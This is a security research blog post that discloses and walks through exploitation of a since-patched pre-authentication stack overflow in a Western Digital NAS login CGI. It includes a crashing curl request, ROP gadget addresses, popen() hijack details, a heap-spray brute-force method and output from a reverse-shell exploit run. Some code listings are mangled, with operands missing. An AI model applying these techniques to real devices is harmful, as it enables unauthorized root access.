# Pwn2Own: A Tale of a Bug Found and Lost Again | CrowdStrike

- **Source :** crowdstrike
- **URL :** https://www.crowdstrike.com/en-us/blog/pwn2own-tale-of-a-bug-found-and-lost-again/
- **Date :** January 27, 2021

---

# Pwn2Own: A Tale of a Bug Found and Lost Again

January 27, 2021

• [ Hanno Heinrichs - Lukas Kupczyk - Max Julian Hofmann](/en-us/blog/author.hanno-heinrichs---lukas-kupczyk---max-julian-hofmann/ "Posts by Hanno Heinrichs - Lukas Kupczyk - Max Julian Hofmann") • [Threat Hunting & Intel](/en-us/blog/category.counter-adversary-operations/ "Threat Hunting & Intel")


In October 2020, the [Pwn2Own Tokyo 2020 announcement](https://www.thezdi.com/blog/2020/7/28/announcing-pwn2own-tokyo-2020-live-from-toronto) caught our attention. Even though originally we hadn’t planned to participate, we checked out the target list and decided to take a look at one of the targets to see where that would lead us. Since some on the team had worked on similar devices in the past, we chose the Western Digital My Cloud Pro Series PR4100 NAS. While eagerly waiting for the device to arrive, our researchers decided to download the device firmware from the vendor’s website and begin investigating. Shortly after we started looking into the firmware, we identified a powerful pre-authentication stack-based buffer overflow bug, which turned out to be interesting to exploit on the actual device. However, while we were able to identify two reliable exploitation methods, Western Digital released the initial public version 5.04.114 of My Cloud OS 5 on October 27, 2020. Among other major changes, that version no longer used the vulnerable code we had looked into. With only about a week left until Pwn2Own, we decided not to submit our research and to consider participation in the next iteration, giving us a bit more lead time. Nevertheless, we still wanted to make sure that the bug was indeed fixed properly, so we contacted the [Western Digital Product Security Incident Response Team (PSIRT](https://www.westerndigital.com/support/productsecurity)), which quickly confirmed that they were already aware of the issue and that it had been addressed in the latest version 5.04.114 of the firmware. The following provides more details on the vulnerability, some of the challenges that had to be overcome, and how reliable exploitation was found to be possible before the issue was addressed in the latest firmware version.

## Overview

**Product**|  My Cloud Pro Series PR4100  
---|---  
**Affected Firmware Versions** (without claim for completeness)| 2.31.204 (2019-12-16) 2.40.155 (2020-07-28) 2.40.157 (2020-10-20)  
**Fixed Firmware Version**|  5.04.114 (2020-10-27)  
**CVE**|  No CVE assigned  
**Root Cause**|  Stack-based Buffer Overflow in **`login_mgr.cgi`**  
**Impact**|  Unauthenticated Remote Code Execution (RCE) as **root**  
**SHA256 Hash of Vulnerable`login_mgr.cgi`**| `**c565243660ddfd1778c8d4a56191880f547780f53cc11e50c4d3b20fadd01247**`  
**Researchers**|  Hanno Heinrichs, Lukas Kupczyk Advanced Research Team, CrowdStrike Intelligence  
**Western Digital Resources**| 

  * [ Release Notes](https://www.westerndigital.com/support/productsecurity/wdc-20007-my-cloud-firmware-version-5-04-114): “My Cloud Firmware Version 5.04.114”
  * [Knowledge Base Article](https://support-en.wd.com/app/answers/detail/a_id/29813/kw/os5/related/1): “How to Update to My Cloud OS 5”

  
  
## Attack Surface Enumeration

When assessing the attack surface of a device, one of the first steps is to enumerate its exposed network services. The following list shows services with opened TCP/UDP listeners running on the device: `root@MyCloudPR4100 root # netstat -tulpn Active Internet connections (only servers) Proto Local Address`

` `

`

Foreign Address State

PID/Program name tcp

0.0.0.0:443

0.0.0.0:*

LISTEN 3320/httpd ``

`

` tcp

127.0.0.1:4700

0.0.0.0:*

LISTEN 4131/cnid_metad tcp

0.0.0.0:445

0.0.0.0:*

LISTEN 4073/smbd tcp

192.168.178.31:49152

0.0.0.0:*

LISTEN 3746/upnp_nas_devic tcp

0.0.0.0:548

0.0.0.0:*

LISTEN 4130/afpd tcp

0.0.0.0:3306

0.0.0.0:*

LISTEN 3941/mysqld tcp

0.0.0.0:139

0.0.0.0:*

LISTEN 4073/smbd tcp

0.0.0.0:80

0.0.0.0:*

LISTEN 3320/httpd

tcp

0.0.0.0:8181

0.0.0.0:*

LISTEN 1609/restsdk-server tcp

0.0.0.0:22

0.0.0.0:*

LISTEN 2761/sshd tcp6

:::445

:::*

LISTEN 4073/smbd tcp6

:::139

:::*

LISTEN 4073/smbd tcp6

:::22

:::*

LISTEN 2761/sshd udp

0.0.0.0:1900

0.0.0.0:*

3746/upnp_nas_devic udp

0.0.0.0:24629

0.0.0.0:*

2076/mserver udp

172.17.255.255:137

0.0.0.0:*

4077/nmbd udp

172.17.42.1:137

0.0.0.0:*

4077/nmbd udp

192.168.178.255:137

0.0.0.0:*

4077/nmbd udp

192.168.178.31:137

0.0.0.0:*

4077/nmbd udp

0.0.0.0:137

0.0.0.0:*

4077/nmbd udp

172.17.255.255:138

0.0.0.0:*

4077/nmbd udp

172.17.42.1:138

0.0.0.0:*

4077/nmbd udp

192.168.178.255:138

0.0.0.0:*

4077/nmbd udp

192.168.178.31:138

0.0.0.0:*

4077/nmbd udp

0.0.0.0:138

0.0.0.0:*

4077/nmbd udp

0.0.0.0:30958

0.0.0.0:*

3808/apkg udp

0.0.0.0:514

0.0.0.0:*

1958/syslogd udp

127.0.0.1:23457

0.0.0.0:*

3985/wdmcserver udp

127.0.0.1:46058

0.0.0.0:*

3746/upnp_nas_devic udp

0.0.0.0:48299

0.0.0.0:*

2481/avahi-daemon: udp

0.0.0.0:5353

0.0.0.0:*

2481/avahi-daemon:` While it would be justifiable to conduct an in-depth analysis of each service, we quickly prioritized functionality that is reachable through the device’s Apache HTTP daemon. Due to Apache itself being quite a hardened target, we focused on device-specific functionality implemented through either custom modules or CGI binaries. The configuration file **`/usr/local/modules/web/apache2/conf/alias.conf`** contains a directive that instructs Apache to source its CGI binaries for the URL path `**/cgi-bin/**` from the local directory `**/var/www/cgi-bin/**` :

`root@MyCloudPR4100 root # cat /usr/<...>/apache2/conf/mods-enabled/alias.conf <IfModule alias_module> <...>

ScriptAlias /cgi-bin/ /var/www/cgi-bin/` However, direct access to `**/cgi-bin/**` is restricted by the configuration file `**rewrite.conf**` , which uses **`mod_rewrite`** to redirect requests that do not originate from `**localhost**` to the PHP script located at **`/web/cgi_api.php`**. The only exception to this rule is the `**webpipe.cgi**` binary, which can be accessed directly. `root@MyCloudPR4100 root # cat /usr/<...>/conf/mods-enabled/rewrite.conf <IfModule rewrite_module>

RewriteEngine on<...>

RewriteRule ^/xml/(.*) /cgi-bin/webpipe.cgi <...>

<Directory "/var/www/cgi-bin.html">

RewriteCond %{REMOTE_ADDR} !^127\.0\.0\.1$

RewriteCond $1 !^abFiles$

RewriteRule ^(\w*).cgi$ /web/cgi_api.php?cgi_name=$1&%{QUERY_STRING}

</Directory> </IfModule>` Thus, direct access to most of the CGI binaries is denied for remote users. Instead, access to them is controlled by the PHP script `**cgi_api.php**` , which acts as a proxy between remote users and CGI binaries and enforces access restrictions. Each HTTP request is evaluated based on its corresponding PHP session and forwarded to the respective CGI binary in case the session is deemed eligible. For example, authenticated administrative users can access arbitrary CGI binaries, while unauthenticated users can only access `**login_mgr.cgi**` , which implements the device’s main authentication mechanism. This circumstance heavily reduces the attack surface, as the Pwn2Own contest rules clearly state that exploits must either be pre-authentication or include an authentication bypass. With the only CGI candidates left being **`webpipe.cgi`** and `**login_mgr.cgi**` , we had to focus on these, as the PHP CGI wrapper script did not exhibit any obvious vulnerabilities. It was found that `**webpipe.cgi**` conducts further access checks that are not likely bypassed. Hence, most of its code is not reachable for unauthenticated users. However, we were able to identify a vulnerability in the CGI binary `**login_mgr.cgi**` that could be triggered by unauthenticated remote users.

## Vulnerability

The CGI binary `**login_mgr.cgi**` implements multiple routines related to the login process. Individual routines can be accessed by providing the POST or GET parameter `**cmd**`. For example, the login routine can be invoked by providing the value `**wd_login**` as the `**cmd**` parameter. The **`wd_login()`** routine at address 0x402980 uses the two parameters `**username**` and `**pwd**` to validate the authentication attempt, and then it composes an HTTP response containing the result in XML. One peculiarity of the implementation is the fact that the password parameter `**pwd**` must be provided in Base64 encoding. The relevant pseudo code is shown below (CGI binary did not contain symbols; functions were named after their perceived purpose during analysis): `<...> `

` `

`

char username<32>;

// BYREF <...> >

char pwd_decoded<64>; // BYREF

char pwd_b64<256>;

// BYREF <...>

cgiFormString("username", username, 32LL);

cgiFormString("pwd", pwd_b64, 256LL);

base64decode(pwd_decoded, pwd_b64, 256);

pos_dbl_slash = index(username, '\\');

if ( !pos_dbl_slash )

{ >

if ( is_username_allowed(username) )

{

login_successful = check_login(username, pwd_decoded); <...>` All buffers (`**username, pwd_b64, pwd_decoded**`) are allocated on the stack in the frame of the `**wd_login()**` function. The `**cgiFormString()**` function copies the `**username**` and `**pwd**` HTTP parameters into their respective stack buffers, `**username**` and `**pwd_b64**`. Afterward, the `**base64decode()**` function takes the Base64-encoded password (`**pwd_b64**`) and stores the decoded result in the `**pwd_decoded**` buffer. Internally, glibc’s `**b64_pton()**` function is used for decoding. However, `**b64_pton()**` is called incorrectly: The size of the target buffer `**pwd_decoded**` is specified as 256 bytes, while only 64 bytes have been allocated for it, which is likely a result of confusing the sizes of the target and source buffers at the call site. From the stack layout, it is apparent that the `**pwd_decoded**` buffer is located before the `**pwd_b64**` buffer. In Base64 encoding, three bytes of data are mapped to four characters of the Base64 alphabet and vice versa. Therefore, a string of 256 Base64 characters can contain up to 192 bytes of decoded data: `256 characters * ¾ bytes/characters = 192 bytes` In the case of `**login_mgr.cgi**` , the Base64-decoded data can overflow 128 bytes into the `**pwd_b64**` source buffer. After that, the `**pwd_b64**` buffer is no longer used by `**wd_login()**` and a potential out-of-bounds write does not affect the further execution of the program. After Base64-decoding the password, the function checks the username against a list of disallowed usernames. If the check succeeds, the function `**check_login()**` is invoked with the username and the Base64-decoded password as its arguments (address `**0x404480**`). The relevant pseudo code of the function `**check_login()**` is shown below: `<...>

char password_copy_shadow<80>; // BYREF

char password_copy_input<88>;

// BYREF`

f_shadow = fopen64("/etc/shadow", "r");

while ( 1 )

{

pwent = fgetpwent(f_shadow);

if ( !pwent )

break;

if ( !strcmp(pwent->pw_name, username) )

{

strcpy(password_copy_shadow, pwent->pw_passwd);

fclose(f_shadow);

strcpy(password_copy_input, pwd_decoded); <...> The file `**/etc/shadow**` is read line by line until an entry with a matching username is found. At that point, the password hash from the entry in the shadow file is copied to the stack-based buffer `**password_copy_shadow**` using `**strcpy()**`. Similarly, the Base64-decoded password that was provided as part of the request is copied from `**pwd_decoded**` to the stack-based buffer `**password_copy_input**` using the same function. Due to the potential overflow during the Base64 decoding, the memory pointed to by **`pwd_decoded`** can contain up to 192 bytes of decoded data. The target buffer `**password_copy_input**` has a fixed size of 88 bytes and is adjacent to the saved registers and the saved return address of `**check_login**`**`()`****.** Thus, the invocation of **`strcpy()`** with the Base64-decoded password as its source can result in an out-of-bounds write of up to 104 bytes into adjacent memory. In case of `**check_login()**` , this allows overwriting the saved registers and its return address. A proof of concept that triggers this vulnerability is shown below: `$ curl -i http://192.168.178.31/cgi-bin/login_mgr.cgi -d \

'cmd=wd_login&username=admin&pwd='`python -c 'print("X"*256)'`` ```HTTP/1.1 500 Internal Server Error <...>` The request results in segmentation fault of the `**login_mgr.cgi**` binary: `Program received signal SIGSEGV, Segmentation fault. 0x00000000004044e6 in ?? () LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\ ──────────────────────< REGISTERS >───────────────────────

RAX

0x0 *RBX

0xd7755dd7755dd775 *RCX

0x4a *RDX

0x4 *RDI

0x607540 ◂— '$1$$bgT/jMUE9hqiA19BpcmCM0' *RSI

0x7fffffffd590 ◂— '$1$$JnmDdozMe7jLVzJ1cGFHU.' *R8

0xffff *R9

0x6971683945554d6a ('jMUE9hqi') *R10

0x7fffffffd140 ◂— 0x0 *R11

0x7ffff60af6a0 (free) ◂— mov

rax, qword ptr *R12

0x5dd7755dd7755dd7 *R13

0xd7755dd7755dd775

R14

0x0

R15

0x0 *RBP

0x755dd7755dd7755d *RSP

0x7fffffffd658 ◂— 0x755dd7755dd7755d *RIP

0x4044e6 ◂— ret <...>`

## Exploitation

In the previous section, we described a stack-based buffer overflow vulnerability that can be triggered remotely as an unauthenticated user. In this section, we take a closer look at the vulnerability and discuss the difficulties we encountered on our way to successful exploitation. The NAS system is based on a 64-bit x86 CPU architecture and uses a Linux 4.1 kernel: `root@MyCloudPR4100 root # uname -a` `Linux MyCloudPR4100 4.1.13 #1 SMP Mon Jun 29 00:11:44 PDT 2020 Build-git249a60f x86_64 GNU/Linux` Further analysis of the CGI binary `**login_mgr.cgi**` using `**file**` and `**checksec**` shows that it was compiled as a 64-bit executable and that compiler hardening flags such as stack canaries and position-independent code/executable (PIC/PIE) are disabled while non-executable memory (NX/DEP) is enabled: `$ file login_mgr.cgi login_mgr.cgi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.39, stripped $ checksec --file=login_mgr.cgi RELRO`

` `

`

STACK CANARY

NX

PIE

RPATH No RELRO

No canary found

NX enabled

No PIE 

No RPATH

````` `RUNPATH

Symbols

FORTIFY

Fortified

Fortifiable

FILE No RUNPATH

No Symbols

No

0

10

login_mgr.cgi` The address space layout randomization (ASLR) security mechanism of the kernel is enabled on the target device, meaning that the stack, the VDSO page, heap segments and libraries will be located at unknown addresses after process creation. `root@MyCloudPR4100 root # cat /proc/sys/kernel/randomize_va_space 2` [Return-oriented programming](https://hovav.net/ucsd/talks/blackhat08.html) (ROP) is a technique commonly used for defeating non-executable memory restrictions. Since `**login_mgr.cgi**` is not a position-independent executable, it will always be mapped at a fixed address, so that ROP gadgets can be sourced conveniently from it. In the given case, the CGI will always be mapped at the base address `**0x400000.**``` There is one caveat, however: On the x86_64 architecture, the two most significant bytes of a 64-bit user-space address will inevitably be null bytes. The `**strcpy()**` function, which eventually carries out the out-of-bounds write operation, will stop at the first occurrence of a null byte in the source buffer. This means that at most one user-space address can be written to the stack, preventing us from using a ROP chain with multiple gadget addresses. Luckily, we can still make the CPU return to _one_ attacker-controlled user-space address upon return from `**check_login()**`. The following stack diagram illustrates the program’s states when triggering the vulnerability:

[![](https://www.crowdstrike.com/content/dam/crowdstrike/www/en-us/wp/2021/01/Figure-1-P2-blog-1.png)](/content/dam/crowdstrike/www/en-us/wp/2021/01/Figure-1-P2-blog.png)(Click image to enlarge)

To recap, overflowing `**pwd_decoded**` with Base64-decoded password data (1) allows us to pass an overly long password to `**check_login()**`. This attacker-supplied password may exceed `**check_login()**`’s `**password_copy_input**` buffer size, and we are therefore able to overwrite the function’s saved registers and its return address (2). Thereby, we can redirect the program’s control flow by supplying the address of a ROP gadget at an offset where it ends up overwriting **check_login()** ’s return address (3). It should be noted that **`pwd_decoded`** may contain null bytes, if they occur _after_ the ROP gadget that should overwrite `**check_login()**` ’s return address. If the first gadget manages to pivot the stack to that memory region, return-oriented programming would allow us to better control the crash, as the gadget chain located there is not subject to the null byte restriction anymore. Therefore, the CGI binary was analyzed for potential stack pivot gadgets. Most of the candidates were gadgets that added a fixed offset to the RSP register. Unfortunately, most of the offsets were either too big or too small to make the RSP register point to the Base64-decoded password. The best gadget that we could find is located at address `**0x403bfe**` and allows us to fully control the `**RBX**` register before making another single jump. The potential stack pivot gadgets were identified with the help of the tool `**[ROPgadget.py](https://github.com/JonathanSalwan/ROPgadget)**` : `$ ROPgadget.py --binary login_mgr.cgi Gadgets information ============================================================ <...> 0x0000000000403bfe : lea rsp, ; pop rbx ; ret <...>` With this pivot, it was only possible to chain one more gadget, since the stack pivot results in the RSP register almost pointing to the end of the user-controlled data, as shown in the following calculation: `In <1>: hex( 0x7f00c8 + 8 + 0x140 ) # RSP+ret into pivot gadget+pivot offset Out<1>: '0x7f0210'` Immediately before the `**ret**` instruction of `**check_login()**` is executed, the RSP register points to `**0x7f00c8**`. It is then advanced by 8 (`**ret**` into stack pivot gadget) and by 0x140 (pivot offset). Comparing this result to the stack layout above, the distance between the new value of the RSP register and the end of the user-controlled data at `**0x7f0220**` is exactly 16 bytes, so that we are now able to set the `**RBX**` register and return to an arbitrary address by using the final 16 bytes of the attacker-controlled buffer. With the initial restrictions slightly lifted, we analyzed the CGI binary for suitable jump targets that would give us even more control over the process.

### Primary Exploitation Strategy

It was noticed that the CGI binary frequently uses `**popen()**` and `**system()**` to execute shell commands. One location at address `**0x402c45**` looked very promising. The `**rep movsq**` instruction copies 976 bytes (or 122 quad words, see next section) from the memory location designated by the RSI register to the memory location that the RDI register points to (`**0x607540**`). `.text:0000000000402C45`

` `

`

rep movsq .text:0000000000402C48

mov

eax, .text:0000000000402C4A

mov

esi, offset aR

; type .text:0000000000402C4F

mov

, eax .text:0000000000402C51

movzx

eax, cs:byte_405EB4 .text:0000000000402C58

mov

, al .text:0000000000402C5B

lea

rdi,

; command .text:0000000000402C5E

call

_popen` Going back to the crash, one can see that the RDI register points to writable memory in the BSS segment of the CGI binary, and the RSI register points to the password hash that was read from the `**shadow**` file. The user-controlled Base64-encoded password is located 272 bytes further: `pwndbg> x/s $rsi 0x7fffffffd590: "$1$$JnmDdozMe7jLVzJ1cGFHU." pwndbg> x/s $rsi+272 0x7fffffffd6a0: 'X' <repeats 127 times>` Therefore, in the context of our target, the `**rep movsq**` instruction, this will copy data that is partially controlled by the user to the BSS segment of the CGI binary, which is located at a known address. Next, the `**type**` argument for the `**popen()**` call is prepared at address **`0x402c4a`**. The remaining `**mov(zx)**` instructions are irrelevant for our goal. The `**lea**` instruction at address `**0x402c5b**` prepares the `**command**` argument for the `**popen()**` call by copying the `**RBX**` register to the RDI register. Finally, the `**popen()**` function is called at address `**0x402c5e**`. Together with our stack pivot gadget, which allows us to point the `**RBX**` register to our controlled data that now resides in the BSS segment, we can effectively control the `**command**` argument of the `**popen()**` call and thereby achieve unauthenticated remote code execution as `**root**`. The attack was implemented as a Python script named `**login_mgr_rce.py**`. It takes the URL of the targeted device (`**url**`) and the IP address of the attacker’s host (`**lhost**`) as arguments. Optionally, one can specify a custom username to be used during exploitation. The script starts a listening socket, builds the ROP chain (which executes a Bash-based connect back shell), sends the HTTP request, and waits for the incoming connection of the connect back shell. It then uses Python’s `**telnetlib**` module to allow user interaction with the remote shell: `$ ./login_mgr_rce.py -h usage: login_mgr_rce.py <-h> <-u USER> url lhost` `positional arguments:

url

lhost` `optional arguments:

-h, --help

show this help message and exit

-u USER, --user USER $ ./login_mgr_rce.py http://192.168.178.31 192.168.178.41 <*> Target URL: http://192.168.178.31/cgi-bin/login_mgr.cgi <+> Started reverse shell listener on port 38287 <+> Building ROP chain <+> Sending magic HTTP request <*> Waiting for reverse shell <+> Accepted connection from ('192.168.178.31', 36288) <+> Enjoy your shell! bash: no job control in this shell bash-4.2# id id uid=0(root) gid=0(root) groups=0(root) bash-4.2# uname -a uname -a Linux MyCloudPR4100 4.1.13 #1 SMP Mon Jun 29 00:11:44 PDT 2020 Build-git249a60f x86_64 GNU/Linux bash-4.2#

`

### Limit Analysis of `**rep movsq**`

In this section, we analyze how much data the `**rep movsq**` instruction that we leveraged earlier will actually copy. As the `**rep**` prefix uses `**RCX**` ’s value to determine how often the `**movsq**` instruction is executed, we need to trace back its value. Thus, we analyzed the code between the vulnerable call to `**strcpy()**` in `**check_login()**` and the `**retn**` instruction where our ROP chain assumes initial control. We noticed that the register is last modified by a call to `**strcmp()**` at address `**0x404535**` , which compares the computed password hash to the stored one. In our case, the comparison looked like this: ``

` `

` ► 0x404535

call

strcmp@plt <strcmp@plt>

s1: 0x607540 ◂— '$1$$2c56ZJLNA4jkKUtQFyhpl.'

s2: 0x7fffffffd590 ◂— '$1$$JnmDdozMe7jLVzJ1cGFHU.'` `pwndbg> x/s $rdi 0x607540:

"$1$$2c56ZJLNA4jkKUtQFyhpl." pwndbg> x/s $rsi 0x7fffffffd590: "$1$$JnmDdozMe7jLVzJ1cGFHU."` On the target device, `**strcmp()**` is resolved to `**__strcmp_ssse3()**` by the dynamic linker. At the end of that function, the difference of the last two compared characters is computed: `.text:0000000000124E30

bsf

rdx, rdx .text:0000000000124E34

movzx

ecx, byte ptr .text:0000000000124E38

movzx

eax, byte ptr .text:0000000000124E3C

sub

eax, ecx .text:0000000000124E3E

retn .text:0000000000124E3E __strcmp_ssse3

endp` First, the Bit Scan Forward (`**bsf**`) instruction stores the offset of the first differing character in the **`RDX`** register. Next, that character is loaded from the password hash previously read from the `**shadow**` file into the `**ECX**` register while the corresponding character from the computed hash is stored in `**EAX**`. Considering the `**crypt()**` alphabet of decimals, uppercase and lowercase alphabet, dot, and slash, `**ECX**` may range from 0x2e (“`**.**` ”) to 0x7a (“`**z**` ”). By coincidence, this value therefore specifies the number of quad words (8 bytes) that will get copied by the `**rep movsq**` instruction during the execution of our ROP chain. In case of the smallest possible value, 368 bytes would get copied, and in case of the largest possible value, 976 bytes would get copied. `root@MyCloudPR4100 cgi-bin # cat /proc/9203/maps 00400000-00407000 r-xp 00000000 07:00 3586 /usr/<...>/cgi/login_mgr.cgi 00607000-00608000 rw-p 00007000 07:00 3586 /usr/<...>/cgi/login_mgr.cgi <...>` From the memory layout, it is apparent that the mapped BSS section got mapped to the segment at `0x00607000-0x00608000`. Luckily, the copy operation facilitated by the `**rep movsq**` instruction will never write past the end of the segment, even if the maximum of 976 bytes is copied. Since the RDI register has a value of `**0x607540**` in our scenario, this can be verified as follows: `In <1>: 0x607540 + 976 <= 0x608000| Out<1>: True`

### Alternative Exploitation Strategy

Another successful exploitation strategy for the vulnerability is to brute force a valid heap address pointing to an attacker-controlled string. On the target device, address space layout randomization is enabled. As our target service is not a forking server, which might allow a byte-wise brute-force attack, in theory brute-force guessing of addresses should be infeasible. To our surprise, we found that the location of the heap segment was not properly randomized by the kernel in the prior firmware version that we looked at. This behavior seemed to affect any process on the target system and was not limited to the `**login_mgr.cgi**` binary. While sampling heap addresses a number of times, the lowest and highest observed start addresses of the heap were only located approximately 31 MB apart. This allowed us to use our stack pivot together with the following gadget to guess a valid heap address for attacker-controlled data, load it into `**RBX**` , and thereby pass it to `**popen()**` : `.text:0000000000402C5B`

` `

`

lea

rdi,

; command .text:0000000000402C5E

call

_popen` If `**RBX**` points to a valid shell command, the command will be executed through the `**popen()**` call. To increase our odds of guessing “the right address,” we sprayed the heap by appending arbitrarily named POST parameters that contained the desired shell command prefixed by a long “space slide.” On average, code execution was regularly achieved after 190 attempts, which in our test setup took approximately 10 to 15 seconds. The average was calculated over 30 runs, and the system was rebooted after 10 and 20 runs. The root cause of the weak randomization was not explored further.

## Summary

In this blog, we described our journey of identifying and exploiting a pre-authentication stack-based buffer overflow vulnerability on the Western Digital My Cloud Pro Series PR4100 NAS that can be used to gain remote access to the device as `**root**`. Two successful strategies that both allowed for fast and reliable exploitation of the vulnerability were established and discussed in depth. The research started as an experiment after the announcement of the Pwn2Own Tokyo 2020. Since the vulnerable code was removed shortly before the contest, we decided not to participate but wanted to share our results nonetheless. We hope you enjoyed reading this blog, and we welcome your feedback. We would like to thank the Western Digital PSIRT for their swift response when contacted about the issue.

#### Additional Resources

  * _Request a free[ CrowdStrike Intelligence threat briefing](https://go.crowdstrike.com/threat-intelligence-briefing.html?utm_campaign=threatintelligence&utm_content=us&utm_medium=sem&utm_source=goog&utm_term=cyber%20threat%20intelligence&_bt=465670942471&_bk=cyber%20threat%20intelligence&_bm=e&_bn=g&_bg=108022039334&gclid=EAIaIQobChMIqsSdwZ-j7AIV9R6tBh23rQErEAAYASAAEgKc8fD_BwE&_ga=2.145914102.359113952.1606756854-1198667695.1606243810) and learn how to stop adversaries targeting your organization._
  * _Learn how to incorporate intelligence on dangerous threat actors into your security strategy by visiting the[ CrowdStrike CROWDSTRIKE FALCON® INTELLIGENCE™ product page](/en-us/endpoint-security-products/falcon-x-threat-intelligence/)._
  * _Read the[ 2020 Global Threat Report](/en-us/resources/reports/2020-crowdstrike-global-threat-report/)._
  * _Learn more about the[ CrowdStrike Falcon® platform by visiting the product webpage.](/en-us/endpoint-security-products/falcon-platform/)_
  * _Test CrowdStrike next-gen AV for yourself. Start your[ free trial of Falcon Prevent™](https://go.crowdstrike.com/try-falcon-prevent.html) today._



[ ](https://www.linkedin.com/shareArticle) [ ](https://twitter.com/share)

* * *

#### Related Content

[ ![PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-InfoStealer?wid=2048&hei=1349&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 15, 2026  PhantomRaven: An LLM-Generated Information Stealer Developed for Bug Bounty Hunting ](/en-us/blog/phantomraven-llm-generated-information-stealer-for-bug-bounty-hunting/) [ ![Peer Pressure: Inside the Sality Botnet Disruption Operation](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-FalCon-Sality?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Sep 01, 2026  Peer Pressure: Inside the Sality Botnet Disruption Operation ](/en-us/blog/inside-sality-botnet-disruption-operation/) [ ![CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates](https://assets.crowdstrike.com/is/image/crowdstrikeinc/Blog-THR-2026?wid=1060&hei=698&fmt=png-alpha&qlt=95,0&resMode=sharp2&op_usm=3.0,0.3,2,0) Threat Hunting & Intel | Aug 03, 2026  CrowdStrike 2026 Threat Hunting Report: Exploitation Window Closes as AI Use Accelerates ](/en-us/blog/crowdstrike-2026-threat-hunting-report/)